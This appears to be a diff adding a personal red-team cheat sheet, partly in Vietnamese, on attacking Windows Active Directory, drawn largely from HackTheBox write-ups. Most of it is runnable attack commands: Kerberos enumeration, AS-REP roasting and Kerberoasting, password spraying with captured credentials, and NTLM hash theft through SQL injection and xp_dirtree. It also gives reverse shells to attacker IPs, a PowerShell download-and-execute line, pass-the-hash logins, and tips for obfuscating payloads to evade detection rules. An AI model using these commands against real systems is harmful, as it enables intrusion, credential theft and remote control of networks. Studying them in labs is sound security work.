@@ -1,0 +1,200 @@
+tiến trình CExecSvc.exe -> in docker container
+netstat -tulpn  #check port are opening
+netstat -ano | findstr LISTEN
+Test-NetConnection -ComputerName 10.20.0.5 -Port 5985
+check ip from domain
+nslookup
+check inbound outbound
+----------------------------------------------------
+53             DNS server
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445      SMB
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+1433     MSSQL
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3389     remote desktop
+5900 VNC
+5985 5986 WinRM
+--------------------------------kerberos
+https://ctf.krloer.com/writeups/pwc/roast_beef/
+https://blog.xpnsec.com/kerberos-attacks-part-1/
+kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
+https://helich0pper.github.io/blackfield/    #Kerberos hash by ASREP
+#checking if any account allows Kerberos pre-authentication
+GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/ -usersfile userlist.txt -no-pass
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#dns---tcpudp-53
+-----------------------------------------------------SMB
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html
+crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' -d flight.htb --users
+#spray bruteforce
+crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' -d flight.htb --continue-on-success
+crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
+smbclient //flight.htb/Web -U c.bum%Tikkycoll_431012284
+smb: \> prompt false
+smb: \> mput *
+------------------------------------------------------RPC  ldap
+rpcclient htb.local -U <username>%<passwd>
+conected: help
+conneced: enumdomusers
+
+https://axcheron.github.io/writeups/htb/forest/
+rpcclient -U "" -N -c enumdomusers 10.129.95.210 
+ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.129.110.245 | grep userPrincipalName
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html
+ldapsearch -x -H ldap://10.129.95.180 -s base namingcontexts
+----------------------------steal NTLM response
+-------------------------check signing  (kí số vào các thôgn điệp SMB)
+https://www.thehacker.recipes/ad/movement/ntlm/relay
+crackmapexec smb $target
+--------------------------
+impacket-smbserver SHARE . -smb2support
+http://school.flight.htb/index.php?view=\\10.10.14.4\SHARE\test
+john test --wordlist=./rockyou.txt
+hashcat test /usr/share/wordlists/rockyou.txt 
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html
+sudo responder -I tun0 -wrfv
+list domain user
+lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb
+lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
+
+https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
+#-----------sqli -> loadfile
+http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00   #mysql
+https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
+EXEC master..xp_dirtree "\\[my ip]\test"; --
+‘;declare @q varchar(99);set @q=’\\192.168.254.52\test’; exec master.dbo.xp_dirtree @q
+#-----------xxe
+#-----------xss
+https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html
+----------------------------
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
+--------------------------NetNTLMv2
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html
+use long random passwords.
+ask the machine for a ticket 
+#-----------------------------------------------rev shell
+https://0xdf.gitlab.io/2020/03/28/htb-sniper.html
+net view 10.10.10.151  #SMB
+rlwrap nc -lnvp 443
+\\10.10.14.17\share\nc64.exe -e cmd.exe 10.10.14.17 433
+
+https://0xdf.gitlab.io/2019/03/12/htb-bastard.html#drupalgeddon2
+#upgrade nishang shell
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/shell.ps1')
+-----------------------------------------------------kubernetes
+https://quantribaomat.com/kubescape-nang-cao-bao-mat-kubernetes-nguon-mo?fbclid=IwAR20jCk_52D-CRZ8ld6t9QVWJpZY1gSfCphBgsXeLAGMh3cYgG_yf-aiCxE
+https://nhattruong.blog/2023/01/19/tan-cong-cac-cum-kubernetes-qua-loi-api-kubelet-misconfigure/
+
+kubectl --kubeconfig kubernetconfig get namespace
+kubectl --kubeconfig kubernetconfig get pods -n <name space>
+kubectl --kubeconfig kubernetconfig describe pod <pod-name> -n secret-namespace
+kubectl --kubeconfig kubernetconfig logs <pod-name> -n secret-namespace
+kubectl --kubeconfig kubernetconfig exec -it <pod-name> -n secret-namespace -- /path/to/command
+--------------------------------------------------connecting
+https://viblo.asia/p/leo-thang-dac-quyen-ngang-tren-windows-zOQJwA5OVMP
+evil-winrm -i flight.htb -u <username> -p <passwd>
+crackmapexec smb flight.htb -u administrator -H <hash>
+rlwrap -cAr psexec.py administrator@flight.htb -hashes <hash>
+psexec.py -hash <hash> Administrator@flight.htb -debug
+xfreerdp /u:Administrator /pth:<hash> /v:flight.htb
+xfreerdp /u:it-admin02 /d:CJ23GROUP /pth:bfccba9165c2b03e8f6981b0034d9d5f /v:10.12.0.2
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+(bậc điều khiển mays desktop)
+
+#enable remote desktop
+https://pureinfotech.com/enable-remote-desktop-command-prompt-windows-10/#:~:text=To%20enable%20Remote%20Desktop%20on,new%20enable%3DYes%E2%80%9D%20commands.
+https://cyberjutsujsc-my.sharepoint.com/personal/tien_cyberjutsu_io/_layouts/15/stream.aspx?id=%2Fpersonal%2Ftien%5Fcyberjutsu%5Fio%2FDocuments%2F2023%2F%F0%9F%8E%9E%20Exploit%20101%20%5BRed%20Team%5D%20Records%20%2D%20CyberJutsu%2F%5BDay%2004%5D%20Lateral%20Movement%2Emp4&referrer=StreamWebApp%2EWeb&referrerScenario=AddressBarCopied%2Eview
+
+svcctl   #service control manager
+atsvc    #remotely create scheduled task
+
+psexec
+smbexec
+atexec
+wmiexec
+dcomexec
+-------------------------------------------------------MSSQL
+https://0xdf.gitlab.io/2022/04/11/htb-tally.html
+mssqlclient.py username:<passwd>@<ip> -debug
+------------------------------------------------------priv
+https://0xdf.gitlab.io/2020/03/28/htb-sniper.html
+.chm file
+-----------------------------------mode security crs
+OWASP ModeSecurity Core Rule Set
+signature-based
+anamoly-based   (so sánh với bình thường)
+-----------------------------------tăng security rules
+giảm performance: xem từng query, tốn tài nguyên ảnh hưởng đến hiệu năng
+sự tiện ích: tên trùng rules (union) bị bắt
+privacy: để phân tích blue team cần nhiều nội dung
+---------------------------tạo payload evasion
+ít để lại log(hạn chế số lần gửi)
+ít chứa kí tự đặc biệt
+kích cỡ ngắn
+obfuscate  vừa phải
+----------suy luận
+nhận diện artifacts nào đang bị bắt (network,log,file...)
+dự đoán blueteam bắt bằng cách nào (signature,behavior,..)
+chỉnh payload suy ra rule cụ thể
+sử dụng 6 cách lừa, kết hợp gg và các nghiên cứu trên mạng
+----------------------------gây noise
+thấp -> cao
+passive recon
+active directory enumeration
+exploit web
+priv escalation
+-------------------kerberos
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+NTLM response = encrypt(challenge, passwd hash)
+Ta biết:
+- NTLM Response
+- challenge
+
+Chưa biết:
+- password hash
+Để crack:
+1/ chuẩn bị wordlist
+2/ hash plaintext password
+3/ tính encrypt(challenge, hash plaintext password ở step 2)
+4/ so sánh với NTLM Reponse, nếu bằng nhau -> đây là password đúng
+--------------------
+ticket granting ticket (AS-REP Roasting)
+để usr lấy service ticcket, khỏi nhập passwd mỗi lần auth, domain biết usr là ai
+xài dc khi admin tắt chế độ pre-auth cho user
+để debug và support cho hệ thống cũ
+Encrypted Session Key = encrypt(session key, user key)
+
+Ta biết:
+- Encrypted Session Key
+- checksum(session key)
+
+Chưa biết:
+- user key
+
+Để crack:
+1/ chuẩn bị wordlist
+2/ hash plaintext password
+3/ tính decrypted(Encrypted Session Key, hash plaintext password ở step 2)
+4/ tính checksum của output ở step 3
+5/ so sánh với checksum đã biết, nếu bằng nhau -> đây là password đúng
+------------------------------
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#cracking
+https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
+ticket granting service (kerbe-roasting)
+server return encrypt(service ticket, service account key)
+mục tiêu lấy service account key để attack service khác
+crack service account key
+# with a password
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+# with an NT hash
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
+lấy dc dữ liệu của service
+truy cập vào service dưới quyền Domain admin ( tạo service ticket tùy ý)
+truy cập vào service bằng passwd vừa crack dc
